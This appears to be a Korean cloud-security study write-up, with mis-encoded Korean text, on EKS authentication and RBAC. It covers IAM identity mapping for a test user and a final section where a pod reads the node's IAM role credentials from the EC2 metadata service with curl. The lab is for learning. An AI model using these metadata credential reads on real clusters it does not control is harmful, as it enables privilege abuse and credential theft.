</span></span><span style="display:flex;"><span><span style="color:#75715e"># (ìƒˆë¡œìš´ ì‰˜) í˜„ì¬ ì ‘ì†í•œ ë³¸ì¸ì˜ RBAC ê¶Œí•œì„ ì‹œê°ì ìœ¼ë¡œ </span>
</span></span><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#34;RBAC View Web http://</span><span style="color:#66d9ef">$(</span>curl -s ipinfo.io/ip<span style="color:#66d9ef">)</span><span style="color:#e6db74">:8800&#34;</span>
</span></span><span style="display:flex;"><span>kubectl rbac-view
</span></span></code></pre></div><p><img src="./images/access-matrix.png" alt="access-matrix"></p>
<p><img src="./images/lookup-rbac.png" alt="lookup RBAC"></p>
<p><img src="./images/whoami-rbac.png" alt="whoami RBAC"></p>
<p><img src="./images/rolesum-rbac.png" alt="rolesum RBAC"></p>
<p><img src="./images/rbac-view.png" alt="rbac-view"></p>
<h3 id="3-1-eks-ì¸ì¦ì¸ê°€-ì‚´í´ë³´ê¸°">3-1. EKS ì¸ì¦/ì¸ê°€ ì‚´í´ë³´ê¸°</h3>
<ul>
<li>STS(Security Token Service)ë¥¼ ê¸°ë°˜</li>
<li>aws-cli v1.16.156ë¶€í„° aws-iam-authenticator ì„¤ì¹˜ ì—†ì´ get-tokenìœ¼ë¡œ íšë“ ê°€ëŠ¥
<ol>
<li>kubectl ~ <code>aws eks get-token</code> ~ EKS Service Endpoint ìš”ì²­ êµ¬ì¡°</li>
<li>kubectlì˜ Client-Go ë¼ì´ë¸ŒëŸ¬ê°€ Pre-Signed URLì„ Tokenizeí•˜ì—¬ ì—”ë“œí¬ì¸íŠ¸ ìš”ì²­ <strong>[Credential ê°€ë“í•¨. ìœ ì˜!]</strong></li>
<li>EKS APIëŠ” Webhook token authenticatorì— Token Review Request<br>
AWS IAM í•´ë‹¹ ì¸ì¦ì„ í˜¸ì¶œ ì™„ë£Œ í›„, User/Roleì˜ ARN ë°˜í™˜</li>
<li>k8s RBAC ì¸ê°€ ì²˜ë¦¬</li>
</ol>
</li>
<li>EKS configmapì—ì„œ <code>system:masters</code>ë‚˜ <code>system:authenticated</code>ë¡œ ì˜ˆìƒë˜ëŠ” ê·¸ë£¹ ì •ë³´ëŠ” ë…¸ì¶œë˜ì§€ ì•ŠìŒ
<ul>
<li>Human Error ì˜ˆë°© ì¶”ì •</li>
<li><code>kubectl rbac-tool whoami</code>ìœ¼ë¡œ ì¡°íšŒ ê°€ëŠ¥</li>
</ul>
</li>
<li>(kubeconfig)v1beta1ì„ ì“°ê³  ìˆëŠ”ë°, ì‹¤ìŠµì„ í•˜ë‹¤ë³´ë©´ ê°„í˜¹ tokenê°’ ì•ë¶€ë¶„ì´ ê¹¨ì ¸ë‚˜ì˜´
<ul>
<li>To-Do: v1(GA) ì´í›„ë¡œ í•´ì„œ í…ŒìŠ¤íŠ¸í•´ë´ì•¼ í•¨</li>
</ul>
</li>
</ul>
<p><img src="./images/throttling-when-using-v1beta1.png" alt="throttling when using v1beta1"></p>
<p><img src="./images/token-broken-when-using-v1beta1.png" alt="token broken when using v1beta1"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># sts caller idì˜ ARN</span>
</span></span><span style="display:flex;"><span>aws sts get-caller-identity --query Arn
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubeconfig ì •ë³´. get-token ì»¤ë§¨ë“œ ì‚½ì… í™•ì¸</span>
</span></span><span style="display:flex;"><span>cat ~/.kube/config | yh
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># STS ì„ì‹œ ë³´ì•ˆ ìê²© ì¦ëª… í† í° ìš”ì²­. ì‹œê°„ê²½ê³¼ ì‹œ í† í° ì¬ë°œê¸‰</span>
</span></span><span style="display:flex;"><span>aws eks get-token --cluster-name $CLUSTER_NAME | jq -r <span style="color:#e6db74">&#39;.status.token&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># tokenreview, Webhook, validatingwebhookconfigurations API ë¦¬ì†ŒìŠ¤ </span>
</span></span><span style="display:flex;"><span>kubectl api-resources | grep authentication
</span></span><span style="display:flex;"><span>kubectl api-resources | grep Webhook
</span></span><span style="display:flex;"><span>kubectl get validatingwebhookconfigurations
</span></span><span style="display:flex;"><span>kubectl get validatingwebhookconfigurations eks-aws-auth-configmap-validation-webhook -o yaml | kubectl neat | yh
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># aws-auth configmap</span>
</span></span><span style="display:flex;"><span>kubectl get cm -n kube-system aws-auth -o yaml | kubectl neat | yh
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># EKSë¥¼ ì„¤ì¹˜í•œ IAM User ì •ë³´</span>
</span></span><span style="display:flex;"><span>kubectl rbac-tool whoami
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># system:masters, system:authenticated ê·¸ë£¹ ì •ë³´</span>
</span></span><span style="display:flex;"><span>kubectl rbac-tool lookup system:masters
</span></span><span style="display:flex;"><span>kubectl rbac-tool lookup system:authenticated
</span></span><span style="display:flex;"><span>kubectl rolesum -k Group system:masters
</span></span><span style="display:flex;"><span>kubectl rolesum -k Group system:authenticated
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># system:masters ê·¸ë£¹ì´ ì‚¬ìš© ê°€ëŠ¥í•œ ClusterRole: cluster-admin</span>
</span></span><span style="display:flex;"><span>kubectl describe clusterrolebindings.rbac.authorization.k8s.io cluster-admin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># cluster-admin ì˜ PolicyRule: ëª¨ë“  ë¦¬ì†ŒìŠ¤ ì‚¬ìš© ê°€ëŠ¥!</span>
</span></span><span style="display:flex;"><span>kubectl describe clusterrole cluster-admin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># system:authenticated ê·¸ë£¹ì´ ì‚¬ìš© ê°€ëŠ¥í•œ ClusterRole</span>
</span></span><span style="display:flex;"><span>kubectl describe ClusterRole system:discovery
</span></span><span style="display:flex;"><span>kubectl describe ClusterRole system:public-info-viewer
</span></span><span style="display:flex;"><span>kubectl describe ClusterRole system:basic-user
</span></span><span style="display:flex;"><span>kubectl describe ClusterRole eks:podsecuritypolicy:privileged
</span></span></code></pre></div><p><img src="./images/tokenreview-mutatingwebhookconfiguration-validatingwebhookconfiguration.png" alt="TokenReview, MutatingWebhookConfiguration, ValidatingWebhookConfiguration"></p>
<p><img src="./images/rbac-lookup-and-rolesum.png" alt="RBAC lookup and rolesum"></p>
<p><img src="./images/clusterrolebindings-and-clusterrole.png" alt="clusterrolebindings and clusterrole"></p>
<h3 id="3-2-ì‹ ê·œ-ì¸í”„ë¼-ê´€ë¦¬ììš©-myeks-bastion-2ì—-eks-ì¸ì¦ì¸ê°€-ì„¤ì •">3-2. ì‹ ê·œ ì¸í”„ë¼ ê´€ë¦¬ììš© myeks-bastion-2ì— EKS ì¸ì¦/ì¸ê°€ ì„¤ì •</h3>
<ul>
<li>ê¸°ì¡´ ì‰˜(myeks-bastion)ê³¼ êµì°¨í•˜ì—¬ ì§„í–‰: testuser ìƒì„± ë° ê¶Œí•œ ìˆ˜ì •</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">##</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># myeks-bastion</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># testuser ìƒì„± ë° í”„ë¡œê·¸ë˜ë° ë°©ì‹ Access ê¶Œí•œ ë¶€ì—¬, ì–´ë“œë¯¼ ì ‘ì† ì •ì±… ì¶”ê°€</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Access Keyì˜ ê²½ìš°, 1íšŒë§Œ ì¶œë ¥ -&gt; ë©”ëª¨</span>
</span></span><span style="display:flex;"><span>aws iam create-user --user-name testuser
</span></span><span style="display:flex;"><span>aws iam create-access-key --user-name testuser
</span></span><span style="display:flex;"><span>aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --user-name testuser
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get-call-identity ARN </span>
</span></span><span style="display:flex;"><span>aws sts get-caller-identity --query Arn
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># testuserê°€ ì ‘ì†í•  myeks-bastion-2 PublicIP í™•ì¸</span>
</span></span><span style="display:flex;"><span>aws ec2 describe-instances --query <span style="color:#e6db74">&#34;Reservations[*].Instances[*].{PublicIPAdd:PublicIpAddress,PrivateIPAdd:PrivateIpAddress,InstanceName:Tags[?Key==&#39;Name&#39;]|[0].Value,Status:State.Name}&#34;</span> --filters Name<span style="color:#f92672">=</span>instance-state-name,Values<span style="color:#f92672">=</span>running --output table
</span></span></code></pre></div><p><img src="./images/create-testuser.png" alt="create testuser"></p>
<p><img src="./images/create-testuser-access-key.png" alt="create testuser access key"></p>
<ul>
<li>í˜„ì¬ ìƒíƒœì—ì„œ testuserëŠ” ì ‘ì†ì€ ê°€ëŠ¥í•˜ì§€ë§Œ, kubectl ë¶ˆê°€
<ul>
<li>ë‹¹ì—°í•˜ê²Œë„, ê´€ë¦¬ì ê·¸ë£¹(<code>system:masters</code>)ê³¼ ë§¤í•‘ì´ ë˜ì§€ ì•Šì•˜ê¸°ì— ë¶ˆê°€</li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">##</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># myeks-bastion-2</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># testuserë¡œ ì ‘ì†</span>
</span></span><span style="display:flex;"><span>ssh ec2-user@<span style="color:#f92672">{</span>myeks-bastion-2 PublicIP<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># testuser IAM ì„¤ì •</span>
</span></span><span style="display:flex;"><span>aws configure
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get-call-identity ARN</span>
</span></span><span style="display:flex;"><span>aws sts get-caller-identity --query Arn
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubectl ëª…ë ¹ì–´ ì‹¤í–‰: ê¶Œí•œ ì—†ìŒ</span>
</span></span><span style="display:flex;"><span>kubectl get node -v6
</span></span><span style="display:flex;"><span>ls ~/.kube
</span></span></code></pre></div><p><img src="./images/testuser-cannot-use-kubectl-without-group-mapping.png" alt="testuser cannot use kubectl without group mapping"></p>
<ul>
<li>ë‹¤ì‹œ, ì›ë˜ ì‰˜ì—ì„œ ê·¸ë£¹ ë¶€ì—¬ë¥¼ í•˜ì—¬ ê¶Œí•œ ì„¤ì •: EKS ê´€ë¦¬ì ë ˆë²¨</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">##</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># myeks-bastion</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##</span>
</span></span><span style="display:flex;"><span>eksctl create iamidentitymapping --cluster $CLUSTER_NAME --username testuser --group system:masters --arn arn:aws:iam::$ACCOUNT_ID:user/testuser
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># system:masters ì ìš© í™•ì¸</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># IAM ë§¤í•‘ í™•ì¸ ì‹œ, ê¸°ì¡´ NodeInstanceRoleì€ ë…¸ë“œì— ì ‘ì†ë  ë•Œ ì‚¬ìš©ë˜ëŠ” IAM Role(Credential í™•ì¸ ë¶ˆê°€, ì„¸ì…˜ê³¼ ê°™ì€ ëŠë‚Œìœ¼ë¡œ ì´í•´)</span>
</span></span><span style="display:flex;"><span>kubectl get cm -n kube-system aws-auth -o yaml | kubectl neat | yh
</span></span><span style="display:flex;"><span>eksctl get iamidentitymapping --cluster $CLUSTER_NAME
</span></span></code></pre></div><p><img src="./images/testuser-after-iamidentitymapping.png" alt="testuser after iamidentitymapping"></p>
<ul>
<li>ë‹¤ì‹œ, testuserì—ì„œ kubectl ëª…ë ¹ì–´ ì‹¤í–‰: ê¶Œí•œ ìˆìŒ
<ul>
<li>ì‹¤í–‰ ì „, kubeconfig ì—…ë°ì´íŠ¸ í•„ìš”</li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">##</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># myeks-bastion-2</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubeconfig ì—…ë°ì´íŠ¸(ìƒì„±)</span>
</span></span><span style="display:flex;"><span>aws eks update-kubeconfig --name $CLUSTER_NAME --user-alias testuser
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubeconfigì— system:masters ê·¸ë£¹ ì¶”ê°€ í™•ì¸</span>
</span></span><span style="display:flex;"><span>cat ~/.kube/config | yh
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubectl ì‹¤í–‰: ê¶Œí•œ ìˆìŒ</span>
</span></span><span style="display:flex;"><span>kubectl ns default
</span></span><span style="display:flex;"><span>kubectl get node -v6
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># rbac-tool: system:masters ê·¸ë£¹ê³¼ ë”ë¶ˆì–´ system:authenticatedê°€ ê°™ì´ ì„¤ì •</span>
</span></span><span style="display:flex;"><span>kubectl krew install rbac-tool <span style="color:#f92672">&amp;&amp;</span> kubectl rbac-tool whoami
</span></span></code></pre></div><ul>
<li>testuserì˜ ê·¸ë£¹ ì¬ì„¤ì • (system:masters -&gt; system:authenticated)
<ul>
<li>í…ìŠ¤íŠ¸ì—ë””í„°ë¡œ ì§ì ‘ í¸ì§‘</li>
<li>(ë˜ëŠ”) iamidentitymapping ì‚­ì œ í›„, ë‹¤ì‹œ ìƒì„±</li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">##</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># myeks-bastion</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>kubectl edit cm -n kube-system aws-auth
</span></span><span style="display:flex;"><span>eksctl get iamidentitymapping --cluster $CLUSTER_NAME
</span></span></code></pre></div><p><img src="./images/edit-testuser-with-authenticated-not-admin.png" alt="edit testuser with authenticated not admin"></p>
<ul>
<li>testuserì—ì„œ kubectl ëª…ë ¹ì–´ ì‹¤í–‰ <strong>ì‹œë„</strong>: ì¼ë¶€ ê¶Œí•œ ì—†ìŒ í™•ì¸
<ul>
<li>config ì—…ë°ì´íŠ¸ë¥¼ í•˜ì§€ ì•Šì•„ë„, ì ìš©ë˜ì–´ ìˆìŒ</li>
<li>pods ì¡°íšŒëŠ” ê°€ëŠ¥í•˜ì§€ë§Œ, nodes ì¡°íšŒëŠ” ë¶ˆê°€</li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">##</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># myeks-bastion-2</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>kubectl get node -v6
</span></span><span style="display:flex;"><span>kubectl api-resources -v5
</span></span></code></pre></div><p><img src="./images/testuser-cannot-use-kubectl-with-authenticated-not-admin.png" alt="testuser cannot use kubectl with authenticated not admin"></p>
<p><img src="./images/only-pods-can-be-listed-with-authenticated.png" alt="only pods can be listed with authenticated"></p>
<ul>
<li>ë¬¼ë¡  testuser IAM ë§¤í•‘ì„ ì‚­ì œí•˜ë©´, ì•„ì˜ˆ ê¶Œí•œì´ ì—†ìŒ</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">##</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># myeks-bastion</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># testuser IAM ë§µí•‘ ì‚­ì œ</span>
</span></span><span style="display:flex;"><span>eksctl delete iamidentitymapping --cluster $CLUSTER_NAME --arn  arn:aws:iam::$ACCOUNT_ID:user/testuser
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>eksctl get iamidentitymapping --cluster $CLUSTER_NAME
</span></span><span style="display:flex;"><span>kubectl get cm -n kube-system aws-auth -o yaml | yh
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">##</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># myeks-bastion-2</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>kubectl get node -v6
</span></span><span style="display:flex;"><span>kubectl api-resources -v5
</span></span></code></pre></div><p><img src="./images/testuser-cannot-use-kubectl-without-iamidentitymapping.png" alt="testuser cannot use kubectl without iamidentitymapping"></p>
<h3 id="3-3-ì˜µì…˜-ec2-instance-profileiam-roleì—-ë§µí•‘ëœ-k8s-rbac-í™•ì¸">3-3. (ì˜µì…˜) EC2 Instance Profile(IAM Role)ì— ë§µí•‘ëœ k8s RBAC í™•ì¸</h3>
<ul>
<li>3-2ì—ì„œ <code>NodeInstanceRole</code>ì„ ì¤‘ê°„ì— í™•ì¸
<ul>
<li><code>system:nodes</code></li>
<li>username: <code>system:node:{{EC2PrivateDNSName}}</code></li>
</ul>
</li>
<li>ì¶”ê°€ IAM ì¦ëª…ì´ ì—†ì–´ë„, ë…¸ë“œì— ìƒì„±ëœ íŒŒë“œì—ì„œ IMDSë¡œ EC2 IAM Role ì‚¬ìš©
<ul>
<li>Token ë§Œë£Œ ì „ê¹Œì§€ ì´ìš© ê°€ëŠ¥. ê¶Œí•œ ìœ ì˜</li>
</ul>
</li>
</ul>
<p><img src="./images/NodeInstanceRole-Keypair.png" alt="NodeInstanceRole Keypair"></p>
<p><img src="./images/NodeInstanceRole-IAM-Role-mapRoles.png" alt="NodeInstanceRole IAM Role mapRoles"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># ë…¸ë“œ ë³„ hostname, sts ARN</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> node in $N1 $N2 $N3; <span style="color:#66d9ef">do</span> ssh ec2-user@$node hostname; <span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> node in $N1 $N2 $N3; <span style="color:#66d9ef">do</span> ssh ec2-user@$node aws sts get-caller-identity --query Arn; <span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># aws-auth ConfigMap</span>
</span></span><span style="display:flex;"><span>kubectl describe configmap -n kube-system aws-auth
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># IAM identity mapping</span>
</span></span><span style="display:flex;"><span>eksctl get iamidentitymapping --cluster $CLUSTER_NAME
</span></span></code></pre></div><ul>
<li>aws-cli(v2) íŒŒë“œë¥¼ ì¶”ê°€í•˜ì—¬, í•´ë‹¹ EC2 ë…¸ë“œì˜ IMDS ì •ë³´ í™•ì¸</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl create -f -
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: apps/v1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Deployment
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: awscli-pod
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  replicas: 2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  selector:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    matchLabels:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      app: awscli-pod
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  template:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      labels:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        app: awscli-pod
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    spec:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      containers:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - name: awscli-pod
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        image: amazon/aws-cli
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        command: [&#34;tail&#34;]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        args: [&#34;-f&#34;, &#34;/dev/null&#34;]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      terminationGracePeriodSeconds: 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>kubectl get pod -owide
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># íŒŒë“œ ì´ë¦„ ë³€ìˆ˜ ì§€ì • í›„ ê° íŒŒë“œì—ì„œ EC2 InstancePrfile(IAM Role) ARN í™•ì¸</span>
</span></span><span style="display:flex;"><span>APODNAME1<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>kubectl get pod -l app<span style="color:#f92672">=</span>awscli-pod -o jsonpath<span style="color:#f92672">={</span>.items<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>.metadata.name<span style="color:#f92672">}</span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>APODNAME2<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>kubectl get pod -l app<span style="color:#f92672">=</span>awscli-pod -o jsonpath<span style="color:#f92672">={</span>.items<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>.metadata.name<span style="color:#f92672">}</span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>echo $APODNAME1, $APODNAME2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>kubectl exec -it $APODNAME1 -- aws sts get-caller-identity --query Arn
</span></span><span style="display:flex;"><span>kubectl exec -it $APODNAME2 -- aws sts get-caller-identity --query Arn
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ì¶”ê°€ IAM ì¦ëª…ì´ ì—†ì–´ë„, IMDSë¡œ EC2 IAM Role ì‚¬ìš©: ê¶Œí•œ ìœ ì˜</span>
</span></span><span style="display:flex;"><span>kubectl exec -it $APODNAME1 -- aws ec2 describe-instances --region ap-northeast-2 --output table --no-cli-pager
</span></span><span style="display:flex;"><span>kubectl exec -it $APODNAME2 -- aws ec2 describe-vpcs --region ap-northeast-2 --output table --no-cli-pager
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># aws-cli íŒŒë“œì— ì‰˜ ì ‘ì† í›„, EC2 ë©”íƒ€ë°ì´í„° í™•ì¸</span>
</span></span><span style="display:flex;"><span>kubectl exec -it $APODNAME1 -- bash
</span></span><span style="display:flex;"><span>curl -s http://169.254.169.254/ -v
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Token ìš”ì²­ </span>
</span></span><span style="display:flex;"><span>curl -s -X PUT <span style="color:#e6db74">&#34;http://169.254.169.254/latest/api/token&#34;</span> -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token-ttl-seconds: 21600&#34;</span> ; echo
</span></span><span style="display:flex;"><span>curl -s -X PUT <span style="color:#e6db74">&#34;http://169.254.169.254/latest/api/token&#34;</span> -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token-ttl-seconds: 21600&#34;</span> ; echo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Tokenì„ ì´ìš©í•œ IMDSv2 ì‚¬ìš©</span>
</span></span><span style="display:flex;"><span>TOKEN<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s -X PUT <span style="color:#e6db74">&#34;http://169.254.169.254/latest/api/token&#34;</span> -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token-ttl-seconds: 21600&#34;</span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>echo $TOKEN
</span></span><span style="display:flex;"><span>curl -s -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token: </span>$TOKEN<span style="color:#e6db74">&#34;</span> â€“v http://169.254.169.254/ ; echo
</span></span><span style="display:flex;"><span>curl -s -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token: </span>$TOKEN<span style="color:#e6db74">&#34;</span> â€“v http://169.254.169.254/latest/ ; echo
</span></span><span style="display:flex;"><span>curl -s -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token: </span>$TOKEN<span style="color:#e6db74">&#34;</span> â€“v http://169.254.169.254/latest/meta-data/iam/security-credentials/ ; echo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ìœ„ì—ì„œ ì¶œë ¥ëœ IAM Roleì„ ì•„ë˜ ì…ë ¥ í›„ í™•ì¸</span>
</span></span><span style="display:flex;"><span>curl -s -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token: </span>$TOKEN<span style="color:#e6db74">&#34;</span> â€“v http://169.254.169.254/latest/meta-data/iam/security-credentials/eksctl-myeks-nodegroup-ng1-NodeInstanceRole-1DC6Y2GRDAJHK
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># íŒŒë“œ ì‰˜ ì¢…ë£Œ</span>
</span></span><span style="display:flex;"><span>exit
</span></span></code></pre></div><p><img src="./images/IMDS-vulnerability-1.png" alt="IMDS vulnerability 1"></p>
<p><img src="./images/IMDS-vulnerability-2.png" alt="IMDS vulnerability 2"></p>
<ul>
<li>aws-cli íŒŒë“œì— kubeconfigë¥¼ í†µí•œ mapRoles ì •ë³´ ìƒì„±</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># node ì˜ IAM Role ARNì„ ë³€ìˆ˜ë¡œ ì§€ì •</span>
</span></span><span style="display:flex;"><span>eksctl get iamidentitymapping --cluster $CLUSTER_NAME
</span></span><span style="display:flex;"><span>NODE_ROLE<span style="color:#f92672">=</span>eksctl-myeks-nodegroup-ng1-NodeInstanceRole-<span style="color:#f92672">{</span>IAM Role ARN<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># awscli íŒŒë“œì—ì„œ kubeconfig ì •ë³´ ìƒì„±</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># í™•ì¸ ì‹œ, ì‹¤í–‰ ì¸ìì— roleë„ ì¶”ê°€ë˜ì—ˆìŒ</span>
</span></span><span style="display:flex;"><span>kubectl exec -it $APODNAME1 -- aws eks update-kubeconfig --name $CLUSTER_NAME --role-arn $NODE_ROLE
</span></span><span style="display:flex;"><span>kubectl exec -it $APODNAME1 -- cat /root/.kube/config | yh
